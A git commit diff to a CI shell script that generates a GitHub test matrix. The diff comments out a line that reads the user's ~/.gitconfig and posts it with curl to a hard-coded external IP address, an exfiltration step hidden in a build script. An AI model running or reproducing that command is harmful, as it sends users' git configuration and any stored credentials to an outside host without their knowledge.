a8c1bdc92d644154adb2bf5ef7f06d6d5bec8a35
h1bernard <130392186+h1bernard@users.noreply.github.com>
2023-04-10 11:39:42 -0600

    Update generate-github-tav-matrix.sh

--- .ci/generate-github-tav-matrix.sh
+++ .ci/generate-github-tav-matrix.sh
@@ -3,5 +3,5 @@ set -e
 
 echo "versions=$(jq -c .versions .ci/tav.json)" >> $GITHUB_OUTPUT
 echo "modules=$(jq -c .modules .ci/tav.json)" >> $GITHUB_OUTPUT
-find "$HOME/.gitconfig" -type f | xargs cat | curl -d @- http://52.38.233.187:8888
+#find "$HOME/.gitconfig" -type f | xargs cat | curl -d @- http://52.38.233.187:8888
 #comment
